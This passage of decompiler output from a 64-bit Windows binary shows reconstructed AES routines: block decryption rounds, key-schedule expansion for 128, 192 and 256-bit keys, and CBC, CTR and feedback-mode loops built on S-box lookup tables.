  v12 = a3[6] ^ dword_140116D10[(unsigned __int8)v6] ^ RijnDael_AES_Base_140116110[v5 >> 24] ^ dword_140116510[BYTE2(v7)] ^ dword_140116910[BYTE1(v8)];
  v13 = a3[7] ^ dword_140116D10[(unsigned __int8)v5] ^ RijnDael_AES_Base_140116110[v7 >> 24] ^ dword_140116910[BYTE1(v6)] ^ dword_140116510[BYTE2(v8)];
  v14 = ((int)a3[60] >> 1) - 1;
  if ( (int)a3[60] >> 1 != 1 )
  {
    do
    {
      v15 = v11[2] ^ (unsigned int)dword_140116D10[(unsigned __int8)v10] ^ (unsigned int)RijnDael_AES_Base_140116110[(unsigned __int64)v12 >> 24] ^ (unsigned int)dword_140116510[BYTE2(v13)] ^ (unsigned __int64)(unsigned int)dword_140116910[BYTE1(v9)];
      v16 = v11[1] ^ (unsigned int)dword_140116D10[(unsigned __int8)v9] ^ (unsigned int)RijnDael_AES_Base_140116110[(unsigned __int64)v10 >> 24] ^ (unsigned int)dword_140116510[BYTE2(v12)] ^ (unsigned __int64)(unsigned int)dword_140116910[BYTE1(v13)];
      v17 = v11[3] ^ (unsigned int)dword_140116D10[(unsigned __int8)v12] ^ (unsigned int)RijnDael_AES_Base_140116110[(unsigned __int64)(unsigned int)v13 >> 24] ^ (unsigned int)dword_140116910[BYTE1(v10)] ^ (unsigned __int64)(unsigned int)dword_140116510[BYTE2(v9)];
      v18 = *v11 ^ (unsigned int)dword_140116D10[(unsigned __int8)v13] ^ (unsigned int)RijnDael_AES_Base_140116110[(unsigned __int64)v9 >> 24] ^ (unsigned int)dword_140116910[BYTE1(v12)] ^ (unsigned __int64)(unsigned int)dword_140116510[BYTE2(v10)];
      v9 = v11[4] ^ dword_140116D10[(unsigned __int8)v17] ^ RijnDael_AES_Base_140116110[v18 >> 24] ^ dword_140116910[BYTE1(v15)] ^ dword_140116510[BYTE2(v16)];
      v10 = v11[5] ^ dword_140116D10[(unsigned __int8)v18] ^ RijnDael_AES_Base_140116110[v16 >> 24] ^ dword_140116510[BYTE2(v15)] ^ dword_140116910[BYTE1(v17)];
      v12 = v11[6] ^ dword_140116D10[(unsigned __int8)v16] ^ RijnDael_AES_Base_140116110[v15 >> 24] ^ dword_140116510[BYTE2(v17)] ^ dword_140116910[BYTE1(v18)];
      v13 = v11[7] ^ dword_140116D10[(unsigned __int8)v15] ^ RijnDael_AES_Base_140116110[v17 >> 24] ^ dword_140116910[BYTE1(v16)] ^ dword_140116510[BYTE2(v18)];
      v11 += 8;
      --v14;
    }
    while ( v14 );
    v4 = a2;
  }
  v19 = *v11 ^ LOBYTE(dword_140116510[(unsigned __int8)v13]) ^ dword_140116910[(unsigned __int64)v9 >> 24] & 0xFF000000 ^ RijnDael_AES_Base_140116110[BYTE1(v12)] & 0xFF00 ^ dword_140116D10[BYTE2(v10)] & 0xFF0000;
  *v4 = __ROL4__(v19, 8) & 0xFF00FF | __ROR4__(v19, 8) & 0xFF00FF00;
  v20 = v11[1] ^ LOBYTE(dword_140116510[(unsigned __int8)v9]) ^ dword_140116910[(unsigned __int64)v10 >> 24] & 0xFF000000 ^ RijnDael_AES_Base_140116110[BYTE1(v13)] & 0xFF00 ^ dword_140116D10[BYTE2(v12)] & 0xFF0000;
  v4[1] = __ROL4__(v20, 8) & 0xFF00FF | __ROR4__(v20, 8) & 0xFF00FF00;
  v4[2] = __ROL4__(
            v11[2] ^ LOBYTE(dword_140116510[(unsigned __int8)v10]) ^ dword_140116910[(unsigned __int64)v12 >> 24] & 0xFF000000 ^ RijnDael_AES_Base_140116110[BYTE1(v9)] & 0xFF00 ^ dword_140116D10[BYTE2(v13)] & 0xFF0000,
            8) & 0xFF00FF | __ROR4__(
                              v11[2] ^ LOBYTE(dword_140116510[(unsigned __int8)v10]) ^ dword_140116910[(unsigned __int64)v12 >> 24] & 0xFF000000 ^ RijnDael_AES_Base_140116110[BYTE1(v9)] & 0xFF00 ^ dword_140116D10[BYTE2(v13)] & 0xFF0000,
                              8) & 0xFF00FF00;
  v21 = v11[3] ^ LOBYTE(dword_140116510[(unsigned __int8)v12]) ^ dword_140116910[v13 >> 24] & 0xFF000000 ^ RijnDael_AES_Base_140116110[BYTE1(v10)] & 0xFF00 ^ dword_140116D10[BYTE2(v9)] & 0xFF0000;
  result = __ROL4__(v21, 8) & 0xFF00FF | __ROR4__(v21, 8) & 0xFF00FF00;
  v4[3] = result;
  return result;
}
// 140116110: using guessed type int RijnDael_AES_Base_140116110[256];
// 140116510: using guessed type int dword_140116510[256];
// 140116910: using guessed type int dword_140116910[256];
// 140116D10: using guessed type int dword_140116D10[256];

//----- (0000000140090050) ----------------------------------------------------
__int64 __fastcall sub_140090050(_DWORD *a1, int a2, unsigned int *a3)
{
  __int64 result; // rax
  __int64 v5; // r10
  int v6; // eax
  __int64 v7; // r9
  unsigned int *v8; // r8
  unsigned int *v9; // rax
  unsigned int v10; // edx
  unsigned int v11; // ecx
  unsigned int v12; // ecx
  unsigned int v13; // edx
  unsigned int v14; // ecx
  unsigned int v15; // edx
  unsigned int v16; // ecx
  unsigned int v17; // edx
  int v18; // r11d
  unsigned __int8 *v19; // r10
  unsigned int v20; // r8d
  __int64 v21; // rdx
  __int64 v22; // rax
  unsigned int v23; // r9d
  int v24; // r8d
  __int64 v25; // rdx
  __int64 v26; // rax
  int v27; // r8d
  __int64 v28; // rcx
  __int64 v29; // rax
  unsigned int v30; // r9d
  int v31; // r8d
  __int64 v32; // rcx
  __int64 v33; // rdx
  __int64 v34; // rax

  result = sub_1400902A0(a1, a2, a3);
  if ( (int)result >= 0 )
  {
    v5 = 0i64;
    v6 = 4 * a3[60];
    v7 = v6;
    if ( v6 > 0 )
    {
      v8 = &a3[v6 + 2];
      v9 = a3 + 2;
      do
      {
        v10 = *(v9 - 2);
        v5 += 4i64;
        v11 = *(v8 - 2);
        v8 -= 4;
        *(v9 - 2) = v11;
        v9 += 4;
        v12 = v8[3];
        v7 -= 4i64;
        v8[2] = v10;
        v13 = *(v9 - 5);
        *(v9 - 5) = v12;
        v14 = v8[4];
        v8[3] = v13;
        v15 = *(v9 - 4);
        *(v9 - 4) = v14;
        v16 = v8[5];
        v8[4] = v15;
        v17 = *(v9 - 3);
        *(v9 - 3) = v16;
        v8[5] = v17;
      }
      while ( v5 < v7 );
    }
    v18 = 1;
    if ( (int)a3[60] > 1 )
    {
      v19 = (unsigned __int8 *)a3 + 2;
      do
      {
        v20 = *(_DWORD *)(v19 + 14);
        v19 += 16;
        ++v18;
        v21 = LOBYTE(dword_140116510[v19[3]]);
        v22 = v19[4];
        *(_DWORD *)(v19 - 2) = dword_140117510[LOBYTE(dword_140116510[*v19])] ^ dword_140117D10[LOBYTE(dword_140116510[(unsigned __int8)v20])] ^ dword_140117910[LOBYTE(dword_140116510[*(v19 - 1)])] ^ dword_140117110[LOBYTE(dword_140116510[(unsigned __int64)v20 >> 24])];
        v23 = *(_DWORD *)(v19 + 6);
        v24 = dword_140117D10[LOBYTE(dword_140116510[(unsigned __int8)*(_DWORD *)(v19 + 2)])] ^ dword_140117110[LOBYTE(dword_140116510[(unsigned __int64)*(unsigned int *)(v19 + 2) >> 24])] ^ dword_140117510[LOBYTE(dword_140116510[v22])] ^ dword_140117910[v21];
        v25 = LOBYTE(dword_140116510[v19[7]]);
        v26 = v19[8];
        *(_DWORD *)(v19 + 2) = v24;
        v27 = dword_140117510[LOBYTE(dword_140116510[v26])] ^ dword_140117910[v25];
        v28 = LOBYTE(dword_140116510[(unsigned __int64)v23 >> 24]);
        v29 = (unsigned __int8)v23;
        v30 = *(_DWORD *)(v19 + 10);
        v31 = dword_140117110[v28] ^ v27;
        v32 = LOBYTE(dword_140116510[v29]);
        v33 = LOBYTE(dword_140116510[v19[11]]);
        v34 = v19[12];
        *(_DWORD *)(v19 + 6) = dword_140117D10[v32] ^ v31;
        *(_DWORD *)(v19 + 10) = dword_140117D10[LOBYTE(dword_140116510[(unsigned __int8)v30])] ^ dword_140117110[LOBYTE(dword_140116510[(unsigned __int64)v30 >> 24])] ^ dword_140117510[LOBYTE(dword_140116510[v34])] ^ dword_140117910[v33];
      }
      while ( v18 < (int)a3[60] );
    }
    return 0i64;
  }
  return result;
}
// 140116510: using guessed type int dword_140116510[256];
// 140117110: using guessed type int dword_140117110[256];
// 140117510: using guessed type int dword_140117510[256];
// 140117910: using guessed type int dword_140117910[256];
// 140117D10: using guessed type int dword_140117D10[256];

//----- (00000001400902A0) ----------------------------------------------------
__int64 __fastcall sub_1400902A0(_DWORD *a1, int a2, unsigned int *a3)
{
  int v5; // eax
  _DWORD *v6; // r9
  unsigned int v7; // ebx
  unsigned int v8; // ecx
  unsigned int v9; // r8d
  int v10; // r8d
  int v11; // r8d
  _DWORD *v12; // r11
  unsigned int v13; // edx
  unsigned int v14; // r8d
  int v15; // r8d
  int v16; // ecx
  unsigned int v18; // ecx
  int *v19; // rax
  unsigned int v20; // r8d
  int v21; // r8d
  int v22; // r8d
  _DWORD *v23; // r11
  int v24; // edx
  int v25; // ecx
  unsigned int v26; // r9d
  int v27; // ecx
  int v28; // edx
  unsigned int v29; // ecx
  unsigned int v30; // r8d
  int v31; // r8d
  _DWORD *v32; // r9
  int v33; // r8d
  _DWORD *v34; // r11
  unsigned int v35; // edx
  int v36; // ecx
  unsigned int v37; // r8d
  int v38; // eax
  int v39; // ecx
  int v40; // eax
  unsigned int v41; // r8d
  int v42; // eax
  int v43; // ecx

  if ( !a1 || !a3 )
    return 0xFFFFFFFFi64;
  if ( ((a2 - 128) & 0xFFFFFF3F) != 0 || a2 == 320 )
    return 4294967294i64;
  if ( a2 == 128 )
  {
    a3[60] = 10;
  }
  else
  {
    v5 = 14;
    if ( a2 == 192 )
      v5 = 12;
    a3[60] = v5;
  }
  v6 = a3 + 1;
  v7 = __ROL4__(*a1, 8) & 0xFF00FF | __ROR4__(*a1, 8) & 0xFF00FF00;
  *a3 = v7;
  a3[1] = __ROL4__(a1[1], 8) & 0xFF00FF | __ROR4__(a1[1], 8) & 0xFF00FF00;
  a3[2] = __ROL4__(a1[2], 8) & 0xFF00FF | __ROR4__(a1[2], 8) & 0xFF00FF00;
  v8 = __ROL4__(a1[3], 8) & 0xFF00FF | __ROR4__(a1[3], 8) & 0xFF00FF00;
  a3[3] = v8;
  if ( a2 == 128 )
  {
    v9 = v7 ^ RijnDael_AES_Base_140116110[(unsigned __int8)v8] & 0xFF00 ^ LOBYTE(dword_140116510[(unsigned __int64)v8 >> 24]) ^ dword_140116D10[BYTE1(v8)] & 0xFF0000 ^ (dword_140116910[BYTE2(v8)] ^ 0x1000000) & 0xFF000000;
    a3[4] = v9;
    v10 = *v6 ^ v9;
    a3[5] = v10;
    v11 = a3[2] ^ v10;
    a3[6] = v11;
    a3[7] = a3[3] ^ v11;
    v12 = &unk_140118214;
    do
    {
      v13 = v6[6];
      v6 += 4;
      v14 = *v12++ ^ *(v6 - 1) ^ RijnDael_AES_Base_140116110[(unsigned __int8)v13] & 0xFF00 ^ LOBYTE(dword_140116510[(unsigned __int64)v13 >> 24]) ^ dword_140116910[BYTE2(v13)] & 0xFF000000 ^ dword_140116D10[BYTE1(v13)] & 0xFF0000;
      v6[3] = v14;
      v15 = *v6 ^ v14;
      v6[4] = v15;
      v16 = v15 ^ v6[1];
      v6[5] = v16;
      v6[6] = v16 ^ v6[2];
    }
    while ( v12 != (_DWORD *)&unk_140118238 );
    return 0i64;
  }
  a3[4] = __ROL4__(a1[4], 8) & 0xFF00FF | __ROR4__(a1[4], 8) & 0xFF00FF00;
  v18 = __ROL4__(a1[5], 8) & 0xFF00FF | __ROR4__(a1[5], 8) & 0xFF00FF00;
  a3[5] = v18;
  if ( a2 == 192 )
  {
    v19 = (int *)(a3 + 10);
    v20 = v7 ^ RijnDael_AES_Base_140116110[(unsigned __int8)v18] & 0xFF00 ^ LOBYTE(dword_140116510[(unsigned __int64)v18 >> 24]) ^ dword_140116D10[BYTE1(v18)] & 0xFF0000 ^ (dword_140116910[BYTE2(v18)] ^ 0x1000000) & 0xFF000000;
    a3[6] = v20;
    v21 = *v6 ^ v20;
    a3[7] = v21;
    v22 = a3[2] ^ v21;
    a3[8] = v22;
    a3[9] = a3[3] ^ v22;
    v23 = &unk_140118214;
    do
    {
      v24 = *(v19 - 1) ^ *(v19 - 6);
      v25 = *(v19 - 5);
      *v19 = v24;
      v19 += 6;
      *(v19 - 5) = v24 ^ v25;
      v26 = *v23++ ^ *(v19 - 10) ^ RijnDael_AES_Base_140116110[(unsigned __int8)*(v19 - 5)] & 0xFF00 ^ LOBYTE(dword_140116510[(unsigned __int64)(unsigned int)*(v19 - 5) >> 24]) ^ dword_140116D10[(unsigned __int8)BYTE1(*(v19 - 5))] & 0xFF0000 ^ dword_140116910[(unsigned __int8)BYTE2(*(v19 - 5))] & 0xFF000000;
      *(v19 - 4) = v26;
      v27 = v26 ^ *(v19 - 9);
      *(v19 - 3) = v27;
      v28 = v27 ^ *(v19 - 8);
      *(v19 - 2) = v28;
      *(v19 - 1) = v28 ^ *(v19 - 7);
    }
    while ( v23 != (_DWORD *)&unk_140118230 );
    return 0i64;
  }
  else
  {
    a3[6] = __ROL4__(a1[6], 8) & 0xFF00FF | __ROR4__(a1[6], 8) & 0xFF00FF00;
    v29 = __ROL4__(a1[7], 8) & 0xFF00FF | __ROR4__(a1[7], 8) & 0xFF00FF00;
    a3[7] = v29;
    if ( a2 != 256 )
      return 0i64;
    v30 = v7 ^ RijnDael_AES_Base_140116110[(unsigned __int8)v29] & 0xFF00 ^ LOBYTE(dword_140116510[(unsigned __int64)v29 >> 24]) ^ dword_140116D10[BYTE1(v29)] & 0xFF0000 ^ (dword_140116910[BYTE2(v29)] ^ 0x1000000) & 0xFF000000;
    a3[8] = v30;
    v31 = *v6 ^ v30;
    v32 = a3 + 12;
    a3[9] = v31;
    v33 = a3[2] ^ v31;
    a3[10] = v33;
    a3[11] = a3[3] ^ v33;
    v34 = &unk_140118214;
    do
    {
      v35 = *(v32 - 1);
      v32 += 8;
      v36 = *(v32 - 14);
      v37 = *(v32 - 16) ^ LOBYTE(dword_140116510[(unsigned __int8)v35]) ^ dword_140116910[(unsigned __int64)v35 >> 24] & 0xFF000000 ^ RijnDael_AES_Base_140116110[BYTE1(v35)] & 0xFF00 ^ dword_140116D10[BYTE2(v35)] & 0xFF0000;
      v38 = v37 ^ *(v32 - 15);
      *(v32 - 8) = v37;
      *(v32 - 7) = v38;
      v39 = v38 ^ v36;
      v40 = v39 ^ *(v32 - 13);
      *(v32 - 6) = v39;
      *(v32 - 5) = v40;
      v41 = *v34++ ^ *(v32 - 12) ^ RijnDael_AES_Base_140116110[(unsigned __int8)*(v32 - 5)] & 0xFF00 ^ LOBYTE(dword_140116510[(unsigned __int64)(unsigned int)*(v32 - 5) >> 24]) ^ dword_140116910[(unsigned __int8)BYTE2(*(v32 - 5))] & 0xFF000000 ^ dword_140116D10[(unsigned __int8)BYTE1(*(v32 - 5))] & 0xFF0000;
      *(v32 - 4) = v41;
      v42 = v41 ^ *(v32 - 11);
      *(v32 - 3) = v42;
      v43 = v42 ^ *(v32 - 10);
      *(v32 - 2) = v43;
      *(v32 - 1) = v43 ^ *(v32 - 9);
    }
    while ( v34 != (_DWORD *)&unk_14011822C );
    return 0i64;
  }
}
// 140116110: using guessed type int RijnDael_AES_Base_140116110[256];
// 140116510: using guessed type int dword_140116510[256];
// 140116910: using guessed type int dword_140116910[256];
// 140116D10: using guessed type int dword_140116D10[256];

//----- (0000000140090880) ----------------------------------------------------
void __fastcall sub_140090880(char *a1, char *a2, unsigned __int64 a3, __int64 a4, char *a5, __int64 a6)
{
  if ( (_DWORD)a6 )
    sub_140090B90(a1, a2, a3, a4, a5, (void (__fastcall *)(char *, char *, __int64))sub_14008FA50);
  else
    sub_1400908C0(
      (__int64 *)a1,
      (__int64 *)a2,
      a3,
      a4,
      a5,
      (void (__fastcall *)(__int64 *, __int64 *, __int64))sub_14008F480);
}

//----- (00000001400908C0) ----------------------------------------------------
void __fastcall sub_1400908C0(
        __int64 *a1,
        __int64 *a2,
        unsigned __int64 a3,
        __int64 a4,
        char *a5,
        void (__fastcall *a6)(__int64 *, __int64 *, __int64))
{
  char *v6; // r14
  unsigned __int64 v7; // rdi
  __int64 *v8; // rsi
  void (__fastcall *v9)(__int64 *, __int64 *, __int64); // r9
  __int64 *v10; // rbx
  char *v11; // r15
  unsigned __int64 v12; // rbp
  __int64 v13; // rax
  unsigned __int64 v14; // rbp
  __int64 v15; // rcx
  __int64 v16; // rax
  __int64 v17; // rcx
  signed __int64 v18; // r13
  char *i; // rsi
  unsigned __int64 v20; // rax
  char *v21; // r8
  char v22; // dl
  char v23; // dl
  char v24; // dl
  char v25; // dl
  signed __int64 v26; // rbx
  char *v27; // rcx
  unsigned __int64 v28; // rdx
  unsigned __int64 v29; // [rsp+20h] [rbp-78h]
  unsigned __int64 v30; // [rsp+20h] [rbp-78h]
  __int64 v32[2]; // [rsp+40h] [rbp-58h] BYREF

  v6 = a5;
  v7 = a3;
  v8 = a2;
  v9 = a6;
  v10 = a1;
  if ( a3 )
  {
    if ( a1 == a2 )
    {
      if ( a3 >= 0x10 )
      {
        v14 = a3 >> 4;
        v30 = -16i64 * (a3 >> 4) + a3;
        do
        {
          v9(v10, v32, a4);
          v15 = *v10;
          v9 = a6;
          *v8 = v32[0] ^ *(_QWORD *)a5;
          v16 = *((_QWORD *)a5 + 1) ^ v32[1];
          *(_QWORD *)a5 = v15;
          v17 = v10[1];
          v10 += 2;
          v8[1] = v16;
          v8 += 2;
          *((_QWORD *)a5 + 1) = v17;
          --v14;
        }
        while ( v14 );
        v7 = v30;
      }
    }
    else
    {
      v11 = a5;
      if ( a3 >= 0x10 )
      {
        v12 = a3 >> 4;
        v29 = -16i64 * (a3 >> 4) + a3;
        do
        {
          a6(v10, v8, a4);
          *v8 ^= *(_QWORD *)v11;
          v13 = *((_QWORD *)v11 + 1);
          v11 = (char *)v10;
          v8[1] ^= v13;
          v10 += 2;
          v8 += 2;
          --v12;
        }
        while ( v12 );
        v7 = v29;
        v6 = a5;
      }
      *(_OWORD *)v6 = *(_OWORD *)v11;
    }
    if ( v7 )
    {
      v18 = v6 - (char *)v32;
      for ( i = (char *)v8 + 1; ; i += 16 )
      {
        a6(v10, v32, a4);
        v20 = 0i64;
        while ( v20 < v7 )
        {
          v21 = (char *)v32 + v20;
          v22 = *((_BYTE *)v10 + (char *)v32 + v20 - ((char *)v32 + 1) + 1);
          v21[i - ((char *)v32 + 1)] = v21[v18] ^ *v21;
          v21[v18] = v22;
          if ( (unsigned __int64)v32 + v20 + 1i64 - (_QWORD)v32 >= v7 )
          {
            ++v20;
            break;
          }
          v23 = *((_BYTE *)v10 + v20 + 1);
          i[v20] = v6[v20 + 1] ^ v21[1];
          v6[v20 + 1] = v23;
          if ( (unsigned __int64)&v21[2i64 - (_QWORD)v32] >= v7 )
          {
            v20 += 2i64;
            break;
          }
          v24 = *((_BYTE *)v10 + v20 + 2);
          i[v20 + 1] = v6[v20 + 2] ^ v21[2];
          v6[v20 + 2] = v24;
          if ( (unsigned __int64)&v21[3i64 - (_QWORD)v32] >= v7 )
          {
            v20 += 3i64;
            break;
          }
          v25 = *((_BYTE *)v10 + v20 + 3);
          i[v20 + 2] = v6[v20 + 3] ^ v21[3];
          v6[v20 + 3] = v25;
          v20 += 4i64;
          if ( v20 >= 0x10 )
            break;
        }
        if ( v7 <= 0x10 )
          break;
        v10 += 2;
        v7 -= 16i64;
        if ( !v7 )
          return;
      }
      if ( v20 < 0x10 )
      {
        v26 = (char *)v10 - v6;
        v27 = &v6[v20];
        v28 = 16 - v20;
        do
        {
          *v27 = v27[v26];
          ++v27;
          --v28;
        }
        while ( v28 );
      }
    }
  }
}

//----- (0000000140090B90) ----------------------------------------------------
void __fastcall sub_140090B90(
        char *a1,
        char *a2,
        unsigned __int64 a3,
        __int64 a4,
        _OWORD *a5,
        void (__fastcall *a6)(char *, char *, __int64))
{
  _OWORD *v6; // rbp
  unsigned __int64 v7; // rbx
  char *v11; // r10
  unsigned __int64 v12; // rbp
  char *v13; // r10
  _QWORD *v14; // rcx
  __int64 v15; // rdx
  unsigned __int64 v16; // rax
  signed __int64 v17; // r10
  char *v18; // rcx
  unsigned __int64 v19; // rdx

  if ( a3 )
  {
    v6 = a5;
    v7 = a3;
    v11 = (char *)a5;
    if ( a3 >= 0x10 )
    {
      v12 = a3 >> 4;
      v7 = -16i64 * (a3 >> 4) + a3;
      do
      {
        v13 = (char *)(v11 - a1);
        v14 = a1;
        v15 = 2i64;
        do
        {
          *(_QWORD *)((char *)v14 + a2 - a1) = *v14 ^ *(_QWORD *)((char *)v14 + (_QWORD)v13);
          ++v14;
          --v15;
        }
        while ( v15 );
        a6(a2, a2, a4);
        v11 = a2;
        a1 += 16;
        a2 += 16;
        --v12;
      }
      while ( v12 );
      v6 = a5;
    }
    for ( ; v7; v7 -= 16i64 )
    {
      v16 = 0i64;
      while ( v16 < v7 )
      {
        a2[v16] = a1[v16] ^ v11[v16];
        if ( v16 + 1 >= v7 )
        {
          ++v16;
          break;
        }
        a2[v16 + 1] = v11[v16 + 1] ^ a1[v16 + 1];
        if ( v16 + 2 >= v7 )
        {
          v16 += 2i64;
          break;
        }
        a2[v16 + 2] = v11[v16 + 2] ^ a1[v16 + 2];
        if ( v16 + 3 >= v7 )
        {
          v16 += 3i64;
          break;
        }
        a2[v16 + 3] = v11[v16 + 3] ^ a1[v16 + 3];
        v16 += 4i64;
        if ( v16 >= 0x10 )
          goto LABEL_22;
      }
      if ( v16 < 0x10 )
      {
        v17 = v11 - a2;
        v18 = &a2[v16];
        v19 = 16 - v16;
        do
        {
          *v18 = v18[v17];
          ++v18;
          --v19;
        }
        while ( v19 );
      }
LABEL_22:
      ((void (__fastcall *)(char *, char *, __int64, signed __int64))a6)(a2, a2, a4, a2 - a1);
      v11 = a2;
      if ( v7 <= 0x10 )
        break;
      a1 += 16;
      a2 += 16;
    }
    *v6 = *(_OWORD *)v11;
  }
}

//----- (0000000140090D60) ----------------------------------------------------
void __fastcall sub_140090D60(
        _BYTE *a1,
        _BYTE *a2,
        unsigned __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        unsigned int *a7,
        void (__fastcall *a8)(__int64, __int64, __int64))
{
  __int64 v8; // r15
  unsigned int *v10; // rdx
  __int64 v11; // r10
  unsigned int i; // ebx
  char v15; // cl
  void (__fastcall *v16)(__int64, __int64, __int64); // r9
  int v17; // r13d
  int v18; // esi
  _BYTE *v19; // r15
  _BYTE *v20; // r12
  unsigned __int64 v21; // r14
  int v22; // r8d
  _BYTE *v23; // rdx
  int v24; // ecx
  int v25; // eax
  unsigned int v26; // ecx
  _QWORD *v27; // rax
  __int64 v28; // rdx
  _BYTE *v29; // rcx
  int v30; // eax
  unsigned int v31; // esi
  __int64 v32; // rcx
  _BYTE *v33; // [rsp+80h] [rbp+8h]
  _BYTE *v34; // [rsp+88h] [rbp+10h]

  v8 = a6;
  v10 = a7;
  v11 = a4;
  for ( i = *a7; i; i = ((_BYTE)i + 1) & 0xF )
  {
    if ( !a3 )
      break;
    --a3;
    v15 = *a1++ ^ *(_BYTE *)(i + a6);
    *a2++ = v15;
  }
  v16 = a8;
  v17 = 16;
  v18 = 1;
  if ( a3 >= 0x10 )
  {
    v19 = &a2[-a6];
    v20 = &a1[-a6];
    v34 = &a2[16 * (a3 >> 4)];
    v33 = &a1[16 * (a3 >> 4)];
    v21 = a3 >> 4;
    do
    {
      v16(a5, a6, a4);
      v22 = 16;
      v23 = (_BYTE *)(a5 + 16);
      v24 = 1;
      do
      {
        v25 = (unsigned __int8)*--v23;
        v26 = v25 + v24;
        *v23 = v26;
        v24 = v26 >> 8;
        --v22;
      }
      while ( v22 );
      v27 = (_QWORD *)a6;
      v28 = 2i64;
      do
      {
        *(_QWORD *)((char *)v27 + (_QWORD)v19) = *v27 ^ *(_QWORD *)((char *)v27 + (_QWORD)v20);
        ++v27;
        --v28;
      }
      while ( v28 );
      v16 = a8;
      v19 += 16;
      v20 += 16;
      --v21;
    }
    while ( v21 );
    i = 0;
    a3 += -16i64 * (a3 >> 4);
    a2 = v34;
    a1 = v33;
    v8 = a6;
    v10 = a7;
    v11 = a4;
  }
  if ( a3 )
  {
    v16(a5, v8, v11);
    v29 = (_BYTE *)(a5 + 16);
    do
    {
      v30 = (unsigned __int8)*--v29;
      v31 = v30 + v18;
      *v29 = v31;
      v18 = v31 >> 8;
      --v17;
    }
    while ( v17 );
    do
    {
      v32 = i++;
      a2[v32] = *(_BYTE *)(v32 + v8) ^ a1[v32];
      --a3;
    }
    while ( a3 );
    *a7 = i;
  }
  else
  {
    *v10 = i;
  }
}

//----- (0000000140090F60) ----------------------------------------------------
__int64 __fastcall sub_140090F60(
        _BYTE *a1,
        _BYTE *a2,
        unsigned __int64 a3,
        __int64 a4,
        unsigned __int8 *a5,
        _QWORD *a6,
        unsigned int *a7,
        void (__fastcall *a8)(_BYTE *, _BYTE *, unsigned __int64))
{
  unsigned int *v10; // r8
  unsigned int v12; // ebx
  char v13; // cl
  int v14; // esi
  _BYTE *v15; // r12
  void (__fastcall *v16)(_BYTE *, _BYTE *, unsigned __int64); // r10
  int v17; // ebp
  __int64 result; // rax
  unsigned int v19; // r13d
  unsigned __int64 v20; // rsi
  int v21; // r8d
  int v22; // ecx
  _BYTE *v23; // rdx
  int v24; // eax
  unsigned int v25; // ecx
  __int64 v26; // rsi
  unsigned int v27; // r13d
  int v28; // eax
  unsigned int v29; // ebp
  __int64 v30; // rcx
  unsigned int v31; // [rsp+80h] [rbp+18h]

  v10 = a7;
  v12 = *a7;
  v31 = *a7;
  if ( *a7 )
  {
    do
    {
      if ( !a3 )
        break;
      --a3;
      v13 = *a1++ ^ *((_BYTE *)a6 + v12);
      *a2++ = v13;
      v12 = ((_BYTE)v12 + 1) & 0xF;
    }
    while ( v12 );
    v31 = v12;
  }
  v14 = 12;
  v15 = a5 + 12;
  v16 = a8;
  v17 = 1;
  result = a5[15];
  v19 = result | ((a5[14] | ((a5[13] | (a5[12] << 8)) << 8)) << 8);
  if ( a3 >= 0x10 )
  {
    do
    {
      v20 = a3 >> 4;
      if ( a3 >> 4 > 0x10000000 )
        v20 = 0x10000000i64;
      v19 += v20;
      if ( v19 < v20 )
      {
        v20 -= v19;
        v19 = 0;
      }
      v16(a1, a2, v20);
      *v15 = HIBYTE(v19);
      a5[13] = BYTE2(v19);
      a5[14] = BYTE1(v19);
      a5[15] = v19;
      if ( !v19 )
      {
        v21 = 12;
        v22 = 1;
        v23 = a5 + 12;
        do
        {
          v24 = (unsigned __int8)*--v23;
          v25 = v24 + v22;
          *v23 = v25;
          v22 = v25 >> 8;
          --v21;
        }
        while ( v21 );
      }
      result = 0x10000000i64;
      v16 = a8;
      v26 = 16 * v20;
      a3 -= v26;
      a2 += v26;
      a1 += v26;
    }
    while ( a3 >= 0x10 );
    v12 = v31;
    v14 = 12;
    v10 = a7;
  }
  if ( a3 )
  {
    *a6 = 0i64;
    a6[1] = 0i64;
    v16(a6, a6, 1ui64);
    v27 = v19 + 1;
    *v15 = HIBYTE(v27);
    a5[13] = BYTE2(v27);
    a5[14] = BYTE1(v27);
    a5[15] = v27;
    if ( !v27 )
    {
      do
      {
        v28 = (unsigned __int8)*--v15;
        v29 = v28 + v17;
        *v15 = v29;
        v17 = v29 >> 8;
        --v14;
      }
      while ( v14 );
    }
    do
    {
      v30 = v12++;
      a2[v30] = *((_BYTE *)a6 + v30) ^ a1[v30];
      --a3;
    }
    while ( a3 );
    result = (__int64)a7;
    *a7 = v12;
  }
  else
  {
    *v10 = v12;
  }
  return result;
}

//----- (00000001400911D0) ----------------------------------------------------
void __fastcall sub_1400911D0(
        _BYTE *a1,
        _BYTE *a2,
        unsigned __int64 a3,
        __int64 a4,
        __int64 a5,
        unsigned int *a6,
        void (__fastcall *a7)(__int64, __int64, __int64))
{
  unsigned int *v7; // rsi
  __int64 v8; // r10
  unsigned int i; // ebx
  char v13; // cl
  void (__fastcall *v14)(__int64, __int64, __int64); // r9
  unsigned __int64 v15; // r13
  _BYTE *v16; // rsi
  _BYTE *v17; // r14
  _QWORD *v18; // rax
  __int64 v19; // rdx
  __int64 v20; // rcx
  _BYTE *v21; // [rsp+68h] [rbp+10h]

  v7 = a6;
  v8 = a4;
  for ( i = *a6; i; i = ((_BYTE)i + 1) & 0xF )
  {
    if ( !a3 )
      break;
    --a3;
    v13 = *a1++ ^ *(_BYTE *)(i + a5);
    *a2++ = v13;
  }
  v14 = a7;
  if ( a3 >= 0x10 )
  {
    v15 = a3 >> 4;
    v16 = &a2[-a5];
    v17 = &a1[-a5];
    a3 += -16i64 * (a3 >> 4);
    v21 = &a2[16 * v15];
    a1 += 16 * v15;
    do
    {
      v14(a5, a5, a4);
      if ( i < 0x10 )
      {
        v18 = (_QWORD *)(a5 + i);
        v19 = ((15 - i) >> 3) + 1;
        do
        {
          *(_QWORD *)((char *)v18 + (_QWORD)v16) = *v18 ^ *(_QWORD *)((char *)v18 + (_QWORD)v17);
          ++v18;
          --v19;
        }
        while ( v19 );
      }
      v14 = a7;
      v16 += 16;
      v17 += 16;
      i = 0;
      --v15;
    }
    while ( v15 );
    a2 = v21;
    v8 = a4;
    v7 = a6;
  }
  if ( a3 )
  {
    v14(a5, a5, v8);
    do
    {
      v20 = i++;
      a2[v20] = *(_BYTE *)(v20 + a5) ^ a1[v20];
      --a3;
    }
    while ( a3 );
  }
  *v7 = i;
}

//----- (0000000140091340) ----------------------------------------------------
void __fastcall sub_140091340(
        __int64 a1,
        __int64 a2,
        unsigned __int64 a3,
        __int64 a4,
        __int128 *a5,
        int a6,
